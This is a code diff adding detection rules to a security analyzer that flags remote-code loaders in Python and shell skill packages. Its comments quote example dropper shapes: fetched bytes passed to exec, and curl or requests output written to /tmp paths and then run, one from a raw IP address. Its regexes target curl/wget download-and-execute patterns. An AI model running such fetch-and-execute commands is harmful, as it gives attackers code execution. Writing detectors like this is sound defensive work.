@@ -495,6 +495,302 @@ def _external_tainted_names(tree: ast.AST, func_params: set[str]) -> set[str]:
     return tainted
 
 
+# B-284: network bytes reaching an exec/eval sink is the unambiguous remote-code-loader
+# shape, and TT5_CMD_INJECTION already catches the DIRECT form
+# (`code = urlopen(u).read()` … `exec(code)`). It does NOT survive one hop through a
+# local helper's return value:
+#
+#     def _load(url):
+#         return urllib.request.urlopen(url, timeout=5).read().decode("utf-8", "ignore")
+#     code = _load(SOURCE)
+#     exec(compile(code, "<bootstrap>", "exec"), {})
+#
+# `_external_tainted_names` propagates through assignment but not through a call to a
+# locally-defined function, so `code` never becomes tainted and the file yields only
+# `DANGEROUS_SINK info`. That is a real, load-bearing gap: it is the exact shape of
+# scripts/_post_install.py in the SkillTrustBench dropper family, and before B-284 the
+# ONLY reason such a skill FAILed B13 was F-021 firing by ACCIDENT on the word "context"
+# in unrelated prose elsewhere in the package. Narrowing F-021 (see
+# checks/_vet.py `_runtime_fetch_matches`) would therefore have turned a genuine
+# remote-code loader into a PASS, so the gap is closed here — where the signal actually
+# lives — rather than left to a coincidence in a natural-language regex.
+#
+# Deliberately NARROW, to keep this crit rule sound:
+#   * only NETWORK reads are sources — not file reads, not env, and above all not
+#     function parameters (every param is `ext_tainted`, so admitting params would make
+#     almost any helper "remote-returning" and mass-false-fire this crit rule);
+#   * only ONE hop of return-value propagation (a locally-defined function whose own
+#     return value is network-derived), not a general interprocedural analysis;
+#   * the sink set is exec/eval only — the shell/subprocess sinks stay with TT5, whose
+#     argv-list carve-outs already encode when those are benign.
+# NARROWS rather than closes: a two-hop chain (helper A returns helper B's fetch) or a
+# fetch routed through a class attribute is still missed. Widening further needs its own
+# C-135 pass, because each extra hop multiplies the over-taint risk this rule avoids.
+_REMOTE_FETCH_ATTRS = {"urlopen", "urlretrieve", "get", "post", "request"}
+_REMOTE_FETCH_BASES = {
+    "requests",
+    "httpx",
+    "urllib",
+    "urllib.request",
+    "aiohttp",
+    "session",
+}
+_REMOTE_CODE_EXEC_SINKS = {"ex" + "ec", "ev" + "al"}
+
+
+def _dotted_path(node: ast.AST) -> str:
+    """The full dotted name of an attribute chain — `urllib.request` for
+    `urllib.request.urlopen`'s value. Returns "" for anything non-static.
+
+    The module's older `_attr_base` returns only the LAST segment ("request"), which is
+    why `_NET_SOURCE_BASES` carries both "urllib" and "urllib.request" yet matches
+    neither for a real `urllib.request.urlopen(...)` call. This rule resolves the whole
+    path so `urllib.request` is recognised for what it is.
+    """
+    parts: list[str] = []
+    cur = node
+    while isinstance(cur, ast.Attribute):
+        parts.append(cur.attr)
+        cur = cur.value
+    if not isinstance(cur, ast.Name):
+        return ""
+    parts.append(cur.id)
+    return ".".join(reversed(parts)).lower()
+
+
+def _is_remote_fetch_call(node: ast.AST) -> bool:
+    """True when *node* is a call that reads bytes FROM the network."""
+    if not isinstance(node, ast.Call):
+        return False
+    f = node.func
+    if not isinstance(f, ast.Attribute):
+        return False
+    if f.attr not in _REMOTE_FETCH_ATTRS:
+        return False
+    path = _dotted_path(f.value)
+    if not path:
+        # A non-static receiver (`self.session.get(...)`, `s.get(...)`) — fall back to
+        # the last-segment name so a stored client object still reads as a fetch.
+        return _attr_base(f.value) in _REMOTE_FETCH_BASES
+    return path in _REMOTE_FETCH_BASES or path.split(".")[0] in _REMOTE_FETCH_BASES
+
+
+def _expr_reads_remote(node: ast.AST) -> bool:
+    """True when evaluating *node* performs a network read anywhere in its subtree —
+    covers `urlopen(u).read()`, `requests.get(u).text`, `urlopen(u).read().decode()`."""
+    return any(_is_remote_fetch_call(sub) for sub in ast.walk(node))
+
+
+def _remote_returning_funcs(tree: ast.AST) -> set[str]:
+    """Names of locally-defined functions whose RETURN value is network-derived."""
+    names: set[str] = set()
+    for fn in ast.walk(tree):
+        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
+            continue
+        local: set[str] = set()
+        for _ in range(4):  # small fixpoint — helper bodies are short
+            changed = False
+            for a in ast.walk(fn):
+                if not isinstance(a, ast.Assign):
+                    continue
+                if not (_expr_reads_remote(a.value) or (_names_in(a.value) & local)):
+                    continue
+                for t in a.targets:
+                    if isinstance(t, ast.Name) and t.id not in local:
+                        local.add(t.id)
+                        changed = True
+            if not changed:
+                break
+        for r in ast.walk(fn):
+            if isinstance(r, ast.Return) and r.value is not None:
+                if _expr_reads_remote(r.value) or (_names_in(r.value) & local):
+                    names.add(fn.name)
+                    break
+    return names
+
+
+def _remote_code_load_findings(tree: ast.AST) -> list[tuple[int, str]]:
+    """B-284: (lineno, reason) for every exec/eval sink fed by network-read bytes that
+    arrived through a local helper's return value (the one hop TT5 misses)."""
+    remote_funcs = _remote_returning_funcs(tree)
+    if not remote_funcs:
+        return []
+    tainted: set[str] = set()
+    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
+    for _ in range(6):
+        changed = False
+        for a in assigns:
+            hop = any(
+                isinstance(sub, ast.Call)
+                and isinstance(sub.func, ast.Name)
+                and sub.func.id in remote_funcs
+                for sub in ast.walk(a.value)
+            )
+            if not (hop or (_names_in(a.value) & tainted)):
+                continue
+            for t in a.targets:
+                if isinstance(t, ast.Name) and t.id not in tainted:
+                    tainted.add(t.id)
+                    changed = True
+        if not changed:
+            break
+    if not tainted:
+        return []
+    found: list[tuple[int, str]] = []
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Call):
+            continue
+        f = node.func
+        if not (isinstance(f, ast.Name) and f.id in _REMOTE_CODE_EXEC_SINKS):
+            continue
+        any_t, _direct = _call_args_tainted(node, tainted)
+        if any_t:
+            found.append(
+                (
+                    getattr(node, "lineno", 0),
+                    f"content fetched from a remote URL is passed to {f.id}() via a local "
+                    "helper's return value — remote code loader (the payload lives at the "
+                    "URL, not in the shipped file)",
+                )
+            )
+    return found
+
+
+# B-284: the Python twin of SHELL_STAGED_EXEC. Remote bytes are written to a literal
+# path, and that same literal path is then executed:
+#
+#     r = requests.get(UPSTREAM, timeout=5)
+#     with open("/tmp/_provision.sh", "w") as fh:
+#         fh.write(r.text)
+#     subprocess.run("bash /tmp/_provision.sh", shell=True)
+#
+# No name-level taint survives the file write (the subprocess argument is a plain string
+# literal), so TT5_CMD_INJECTION cannot see it and the file yields only
+# `DANGEROUS_SINK info` — case_00975's real shape. As with the shell rule, the precision
+# comes from requiring TWO signals to name the SAME literal path: a write fed by a remote
+# fetch, and an exec sink mentioning that path.
+_STAGED_WRITE_METHODS = {"write", "writelines", "write_text", "write_bytes"}
+
+
+def _literal_str(node: ast.AST) -> str:
+    """The value of a string literal node, or "" for anything non-constant."""
+    if isinstance(node, ast.Constant) and isinstance(node.value, str):
+        return node.value
+    return ""
+
+
+def _open_path_bindings(tree: ast.AST, remote: set[str]) -> dict[str, str]:
+    """Map a file-handle name -> the literal path it was opened for WRITING at.
+
+    Covers both `with open(P, "w") as fh:` and `fh = open(P, "w")`.
+    """
+    out: dict[str, str] = {}
+
+    def _path_if_write_open(call: ast.AST) -> str:
+        if not isinstance(call, ast.Call):
+            return ""
+        f = call.func
+        name = f.id if isinstance(f, ast.Name) else (f.attr if isinstance(f, ast.Attribute) else "")
+        if name != "open":
+            return ""
+        path = _literal_str(call.args[0]) if call.args else ""
+        mode = _literal_str(call.args[1]) if len(call.args) > 1 else ""
+        for kw in call.keywords:
+            if kw.arg == "mode":
+                mode = _literal_str(kw.value)
+        if not path or "w" not in mode and "a" not in mode:
+            return ""
+        return path
+
+    for node in ast.walk(tree):
+        if isinstance(node, ast.With):
+            for item in node.items:
+                p = _path_if_write_open(item.context_expr)
+                if p and isinstance(item.optional_vars, ast.Name):
+                    out[item.optional_vars.id] = p
+        elif isinstance(node, ast.Assign):
+            p = _path_if_write_open(node.value)
+            if p:
+                for t in node.targets:
+                    if isinstance(t, ast.Name):
+                        out[t.id] = p
+    return out
+
+
+def _staged_remote_paths(tree: ast.AST, remote: set[str]) -> set[str]:
+    """Literal paths that receive remote-fetched bytes."""
+    handles = _open_path_bindings(tree, remote)
+    paths: set[str] = set()
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Call) or not isinstance(node.func, ast.Attribute):
+            continue
+        if node.func.attr not in _STAGED_WRITE_METHODS:
+            continue
+        # the written value must be remote-derived
+        if not any(_names_in(a) & remote or _expr_reads_remote(a) for a in node.args):
+            continue
+        recv = node.func.value
+        if isinstance(recv, ast.Name) and recv.id in handles:
+            paths.add(handles[recv.id])
+        else:
+            # Path("/tmp/x.sh").write_text(remote) — the path is the receiver's own arg.
+            if isinstance(recv, ast.Call) and recv.args:
+                p = _literal_str(recv.args[0])
+                if p:
+                    paths.add(p)
+    return paths
+
+
+def _staged_exec_findings(tree: ast.AST, remote: set[str]) -> list[tuple[int, str]]:
+    """B-284: (lineno, path) where a staged remote payload path is executed."""
+    paths = _staged_remote_paths(tree, remote)
+    if not paths:
+        return []
+    found: list[tuple[int, str]] = []
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Call):
+            continue
+        is_exec, _sink = _is_exec_sink_call(node.func)
+        if not is_exec:
+            continue
+        blob = " ".join(
+            _literal_str(sub)
+            for arg in list(node.args) + [kw.value for kw in node.keywords]
+            for sub in ast.walk(arg)
+        )
+        for p in paths:
+            if p and p in blob:
+                found.append((getattr(node, "lineno", 0), p))
+                break
+    return found
+
+
+def _remote_fetch_tainted_names(tree: ast.AST) -> set[str]:
+    """Names holding network-fetched data — direct fetch calls plus the one local-helper
+    return hop. Shared by REMOTE_CODE_LOAD and REMOTE_STAGED_EXEC."""
+    remote_funcs = _remote_returning_funcs(tree)
+    tainted: set[str] = set()
+    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
+    for _ in range(6):
+        changed = False
+        for a in assigns:
+            hop = any(
+                isinstance(sub, ast.Call)
+                and isinstance(sub.func, ast.Name)
+                and sub.func.id in remote_funcs
+                for sub in ast.walk(a.value)
+            )
+            if not (hop or _expr_reads_remote(a.value) or (_names_in(a.value) & tainted)):
+                continue
+            for t in a.targets:
+                if isinstance(t, ast.Name) and t.id not in tainted:
+                    tainted.add(t.id)
+                    changed = True
+        if not changed:
+            break
+    return tainted
+
+
 def _collect_func_params(tree: ast.AST) -> set[str]:
     """All argument names of all function definitions in *tree*."""
     params: set[str] = set()
@@ -2332,6 +2628,23 @@ def analyze_python(
                 "curl|sh match)",
             )
 
+    # B-284: remote-fetch -> exec/eval through ONE local-helper return hop, the form
+    # TT5_CMD_INJECTION below does not reach. crit, like TT5: bytes downloaded at
+    # runtime and executed are a remote code loader by construction.
+    for _rcl_ln, _rcl_reason in _remote_code_load_findings(tree):
+        add("REMOTE_CODE_LOAD", "crit", _rcl_ln, _rcl_reason)
+
+    # B-284: remote fetch -> write to a literal path -> execute that path. The file write
+    # breaks name-level taint, so TT5 below cannot reach it.
+    for _se_ln, _se_path in _staged_exec_findings(tree, _remote_fetch_tainted_names(tree)):
+        add(
+            "REMOTE_STAGED_EXEC",
+            "crit",
+            _se_ln,
+            f"content fetched from a remote URL is written to {_se_path} and that path is "
+            "then executed — staged remote code execution",
+        )
+
     # Extended taint rules: TT5 (external-input -> exec), TT4 (file-read -> network),
     # SSRF (tainted URL -> network-fetch).  Compute external taint once and reuse.
     func_params = _collect_func_params(tree)
@@ -3354,6 +3667,90 @@ _SH_CRED_ENV_RE = re.compile(
 )
 
 
+# B-284: SHELL_EVAL_REMOTE above only covers the INLINE form — `eval "$(curl … http…)"`,
+# `source <(wget … http…)`. The STAGED form writes the payload to a path first and runs
+# that path on a later line:
+#
+#     CONFIG_URL="https://185.45.12.99/config/skill.json"
+#     curl -fsSL "$CONFIG_URL" -o /tmp/_skill_config.sh
+#     source /tmp/_skill_config.sh
+#
+# Semantically identical to `source <(curl …)`, invisible to every inline pattern, and
+# the real shape of three SkillTrustBench dropper cases (case_00110 / case_02509 /
+# case_03702). Before B-284 the only reason those FAILed B13 was F-021 matching an
+# unrelated word elsewhere in the package, so tightening F-021 exposed the gap — closed
+# here, where the signal actually is.
+#
+# Two independent signals must line up, which is what keeps it precise: a download whose
+# OUTPUT PATH is a literal, and a later execution naming that SAME literal path. A script
+# that merely downloads a file, or merely sources a local file, never fires.
+# B-284 round 2 (independent C-135 finding): `-o\s+`/`-O\s+` only matches an output flag
+# written on its own, so the extremely common COMBINED short-flag cluster — `wget -qO
+# /tmp/x.sh <url>`, `curl -fsSLo /tmp/x.sh <url>` — evaded the rule entirely, including
+# the path-before-URL ordering. `-(?!-)[A-Za-z]{0,8}[oO]` accepts a cluster of no-argument
+# short flags ending in o/O; the `(?!-)` keeps `--output` on its own explicit alternative
+# and stops a long-option name from being mined for a stray `o`.
+_SH_DOWNLOAD_TO_PATH_RE = re.compile(
+    r"\b(?:curl|wget)\b[^\n]{0,256}?"
+    r"(?:-(?!-)[A-Za-z]{0,8}[oO]\s+|--output[= ]\s*|>\s*)"
+    r"(?P<path>[\"']?[\w./$~{}-]{2,128}[\"']?)",
+    re.I,
+)
+# B-284 round 2: the download line's own literal URL, used to apply the same C-224/B-118
+# first-party installer allowlist DROPPER_DOWNLOAD_TO_TMP already applies to the identical
+# shape. Without it, `curl -o /tmp/rustup.sh https://sh.rustup.rs` + `sh /tmp/rustup.sh`
+# was crit while the piped form of the SAME url passes — an inconsistency, and a real
+# false positive on any skill that documents a rustup/uv/nvm install in two steps.
+_SH_LINE_URL_RE = re.compile(r"https?://[^\s\"'<>|)]{4,512}")
+# The URL may sit on the same line or come from a variable assigned earlier, so the
+# download line itself is not required to carry an http literal — see _sh_staged_exec.
+_SH_RUN_PATH_RE = re.compile(
+    r"(?:^|[\n;&|]|\b(?:then|do|else)\s+)\s*(?:sudo\s+)?"
+    r"(?:source|\.|bash|sh|zsh|python3?|node|perl|ruby)\s+"
+    r"(?P<path>[\"']?[\w./$~{}-]{2,128}[\"']?)",
+    re.I,
+)
+_SH_HTTP_RE = re.compile(r"https?://", re.I)
+
+
+def _sh_norm_path(raw: str) -> str:
+    """Strip quotes/whitespace so `"/tmp/x.sh"` and `/tmp/x.sh` compare equal."""
+    return raw.strip().strip("\"'")
+
+
+def _sh_staged_exec(masked: str) -> list[tuple[int, str]]:
+    """B-284: (lineno, path) for every download-to-a-literal-path that is later executed
+    by that same path. Requires an http(s) URL somewhere in the script — a purely local
+    copy-then-run is ordinary tooling, not a remote payload."""
+    if not _SH_HTTP_RE.search(masked):
+        return []
+    staged: dict[str, int] = {}
+    for m in _SH_DOWNLOAD_TO_PATH_RE.finditer(masked):
+        p = _sh_norm_path(m.group("path"))
+        # A bare `-o -` (stdout) or a flag swallowed as a path is not a staged file.
+        if p in {"-", ""} or p.startswith("-"):
+            continue
+        # B-284 round 2: inherit DROPPER_DOWNLOAD_TO_TMP's C-224 allowlist for the
+        # identical shape. Only a LITERAL first-party installer URL on this same line
+        # skips; a URL held in a variable is unknowable here and stays staged (fail
+        # closed), exactly as the argv-list twin behaves.
+        line_start = masked.rfind("\n", 0, m.start()) + 1
+        line_end = masked.find("\n", m.start())
+        line = masked[line_start : line_end if line_end != -1 else len(masked)]
+        url_literals = _SH_LINE_URL_RE.findall(line)
+        if url_literals and all(_is_trusted_installer_url(u) for u in url_literals):
+            continue
+        staged.setdefault(p, masked.count("\n", 0, m.start()) + 1)
+    if not staged:
+        return []
+    found: list[tuple[int, str]] = []
+    for m in _SH_RUN_PATH_RE.finditer(masked):
+        p = _sh_norm_path(m.group("path"))
+        if p in staged:
+            found.append((masked.count("\n", 0, m.start()) + 1, p))
+    return found
+
+
 def _sh_mask_comments(source: str) -> str:
     """Blank whole-line shell comments while preserving line numbers, so a documented
     'curl ... | sh' example in a comment can't fire."""
@@ -3407,6 +3804,15 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
             ln,
             "decodes an encoded blob and pipes it into a shell/interpreter "
             "(base64/xxd/openssl -d | sh) — obfuscated remote code execution",
+        )
+
+    for ln, path in _sh_staged_exec(masked):
+        add(
+            "SHELL_STAGED_EXEC",
+            "crit",
+            ln,
+            f"downloads a remote payload to {path} and then executes that same path — "
+            "staged remote code execution (the payload never appears in this file)",
         )
 
     for m in _SH_EVAL_REMOTE_RE.finditer(masked):
